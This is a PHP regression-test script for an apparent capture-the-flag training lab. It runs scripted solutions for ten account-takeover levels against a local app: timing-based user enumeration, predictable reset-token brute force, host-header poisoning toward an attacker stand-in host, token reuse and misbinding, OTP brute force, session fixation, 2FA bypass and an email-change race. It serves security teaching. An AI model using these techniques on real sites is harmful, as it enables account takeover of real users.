<?php
/**
 * Auth Reset Lab · self-test
 * ---------------------------------------------------------------------------
 * Runs the intended solution for every level against the live application and
 * reports whether the flag came back. Each level is reset first, so the run is
 * repeatable.
 *
 *   docker compose exec -T web php /var/www/html/solve_check.php
 *
 * Not part of the challenge. It exists so the lab can be regression-tested.
 */

require_once __DIR__ . '/helpers.php';

/* =========================================================================
 * A minimal HTTP client with a cookie jar. Several levels depend on session
 * continuity, so cookies have to survive between requests.
 * ===================================================================== */

final class ArHttp
{
    private array $jar = [];

    public function __construct(private string $base = 'http://localhost') {}

    public function get(string $path): string
    {
        return $this->send($path, null);
    }

    public function post(string $path, array $fields): string
    {
        return $this->send($path, $fields);
    }

    public function cookie(string $name): string
    {
        return (string)($this->jar[$name] ?? '');
    }

    private function send(string $path, ?array $fields): string
    {
        $header = "Accept: text/html\r\nConnection: close\r\n";
        if ($this->jar) {
            $pairs = [];
            foreach ($this->jar as $k => $v) {
                $pairs[] = $k . '=' . $v;
            }
            $header .= 'Cookie: ' . implode('; ', $pairs) . "\r\n";
        }

        $opt = [
            'method'        => $fields === null ? 'GET' : 'POST',
            'timeout'       => 180,
            'ignore_errors' => true,
        ];
        if ($fields !== null) {
            $header .= "Content-Type: application/x-www-form-urlencoded\r\n";
            $opt['content'] = http_build_query($fields);
        }
        $opt['header'] = $header;

        $body = @file_get_contents($this->base . $path, false, stream_context_create(['http' => $opt]));

        foreach ($http_response_header ?? [] as $h) {
            if (stripos($h, 'Set-Cookie:') === 0) {
                $pair = explode(';', trim(substr($h, 11)))[0];
                [$k, $v] = array_pad(explode('=', $pair, 2), 2, '');
                if ($k !== '') {
                    $this->jar[$k] = $v;
                }
            }
        }
        return (string)$body;
    }
}

/* =========================================================================
 * Harness
 * ===================================================================== */

$pass = 0;
$fail = 0;

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = ar_flag($level);
    if (strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note === '' ? '' : "   ($note)");
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note === '' ? '' : "   ($note)");
    }
}

function grab(string $pattern, string $subject): string
{
    return preg_match($pattern, $subject, $m) ? $m[1] : '';
}

/** md5(email . t) for a window around the printed clock. */
function candidates(string $email, int $clock, int $back = 4, int $fwd = 1): string
{
    $out = [];
    for ($t = $clock - $back; $t <= $clock + $fwd; $t++) {
        $out[] = md5($email . $t);
    }
    return implode("\n", $out);
}

echo "Auth Reset Lab self-test\n------------------------\n";

$admin = AR_ADMIN;
$guest = AR_GUEST;

/* ── 1 · Username enumeration by response time ──────────────────────────── */
$c = new ArHttp();
$c->post('/level1.php', ['_reset_level' => 1]);
$c->post('/level1.php', ['measure_all' => 1]);
$body = $c->post('/level1.php', ['classify' => 1, 'exists' => ar_l1_existing()]);
check(1, $body, 'measured 8 addresses, classified 4 as live');

/* ── 2 · Predictable reset token ────────────────────────────────────────── */
$c = new ArHttp();
$c->post('/level2.php', ['_reset_level' => 1]);
$body  = $c->post('/level2.php', ['request_reset' => 1, 'target' => $admin]);
$clock = (int)grab('~Server time: <strong>(\d+)</strong>~', $body);
$body  = $c->post('/level2.php', [
    'try_candidates' => 1,
    'candidates'     => candidates($admin, $clock),
    'new_password'   => 'owned-by-level-2',
]);
check(2, $body, "clock $clock, 6 candidates");

/* ── 3 · Host header poisoning ──────────────────────────────────────────── */
$c = new ArHttp();
$c->post('/level3.php', ['_reset_level' => 1]);
$c->post('/level3.php', ['send' => 1, 'target' => $admin, 'host' => 'attacker.hackinlab.internal']);
$c->post('/level3.php', ['victim' => 1]);
$log   = $c->get('/collector.php');
$token = grab('~ar-mono ar-hit">\s*([0-9a-f]{32})~', $log);
$body  = $c->post('/level3.php', ['redeem' => 1, 'token' => $token, 'new_password' => 'owned-by-level-3']);
check(3, $body, $token === '' ? 'nothing captured' : 'captured ' . substr($token, 0, 12) . '...');

/* ── 4 · Token not bound to the account ─────────────────────────────────── */
$c = new ArHttp();
$c->post('/level4.php', ['_reset_level' => 1]);
$c->post('/level4.php', ['send' => 1, 'target' => $guest]);
$mail  = $c->get('/mailbox.php?level=4');
$token = grab('~Token:\s*([0-9a-f]{32})~', $mail);
$body  = $c->post('/level4.php', [
    'reset' => 1, 'token' => $token, 'email' => $admin, 'new_password' => 'owned-by-level-4',
]);
check(4, $body, 'own token, administrator account field');

/* ── 5 · Token survives use ─────────────────────────────────────────────── */
$c = new ArHttp();
$c->post('/level5.php', ['_reset_level' => 1]);
$mail  = $c->get('/mailbox.php?level=5');
$token = grab('~reset\.php\?token=([0-9a-f]{32})~', $mail);
$body  = $c->post('/level5.php', ['redeem' => 1, 'token' => $token, 'new_password' => 'owned-by-level-5']);
check(5, $body, 'forwarded link from 431 days ago');

/* ── 6 · No rate limit on the OTP ───────────────────────────────────────── */
$c = new ArHttp();
$c->post('/level6.php', ['_reset_level' => 1]);
$c->post('/level6.php', ['start' => 1, 'target' => $admin]);
$body    = '';
$batches = 0;
for ($from = 0; $from < 1000000; $from += 250000) {
    $batches++;
    $body = $c->post('/level6.php', [
        'run_batch' => 1, 'target' => $admin, 'from' => $from, 'count' => 250000,
    ]);
    if (strpos($body, ar_flag(6)) !== false) {
        break;
    }
}
check(6, $body, "$batches batch(es) of 250,000");

/* ── 7 · Session fixation ───────────────────────────────────────────────── */
$c   = new ArHttp();
$c->post('/level7.php', ['_reset_level' => 1]);
$sid = 'hl-fixed-001';
$c->get('/level7.php?sid=' . $sid);
$c->post('/level7.php', ['send_link' => 1, 'victim_sid' => $sid]);
$body = $c->get('/level7.php?sid=' . $sid);
check(7, $body, "sid=$sid survived the administrator's login");

/* ── 8 · Second factor only guards the response ─────────────────────────── */
$c = new ArHttp();
$c->post('/level8.php', ['_reset_level' => 1]);
$body   = $c->post('/level8.php', [
    'login' => 1, 'email' => $admin, 'password' => AR_L8_ADMIN_PASSWORD,
]);
// The page prints the response body HTML-escaped, so the quotes arrive as
// &quot; - match either form.
$bearer = grab('~sid(?:"|&quot;):\s*(?:"|&quot;)([0-9a-f]{24})~', $body);
$body   = $c->post('/level8.php', ['console' => 1, 'bearer' => $bearer]);
check(8, $body, 'console opened with otp_verified = 0');

/* ── 9 · The email change race ──────────────────────────────────────────── */
$c = new ArHttp();
$c->post('/level9.php', ['_reset_level' => 1]);
$c->post('/level9.php', ['send' => 1]);
$mail  = $c->get('/mailbox.php?level=9');
$token = grab('~Token:\s*([0-9a-f]{32})~', $mail);
$c->post('/level9.php', ['change_email' => 1, 'new_email' => 'ADMIN@hackinlab.internal']);
$body = $c->post('/level9.php', ['redeem' => 1, 'token' => $token, 'new_password' => 'owned-by-level-9']);
check(9, $body, 'ADMIN@ accepted as new, resolved as the administrator');

/* ── 10 · Chain ─────────────────────────────────────────────────────────── */
$c = new ArHttp();
$c->post('/level10.php', ['_reset_level' => 1]);

$found = '';
foreach (ar_l10_candidates() as $cand) {           // stage 1: enumerate
    $body = $c->post('/level10.php', ['send' => 1, 'target' => $cand]);
    // The confirmation names the address; the rejection names it too, so match
    // the sentence rather than the address.
    if (strpos($body, 'Reset instructions sent to <code>' . $cand . '</code>') !== false) {
        $found = $cand;
        break;
    }
}
$body  = $c->post('/level10.php', ['send' => 1, 'target' => $found]);   // stage 2
$clock = (int)grab('~Server time: <strong>(\d+)</strong>~', $body);
$c->post('/level10.php', [                                             // stages 3-4
    'redeem' => 1, 'candidates' => candidates($found, $clock), 'new_password' => 'owned-by-level-10',
]);
$body = $c->post('/level10.php', [                                     // stage 5
    'login' => 1, 'email' => $found, 'password' => 'owned-by-level-10',
]);
check(10, $body, "enumerated $found, clock $clock");

echo "------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
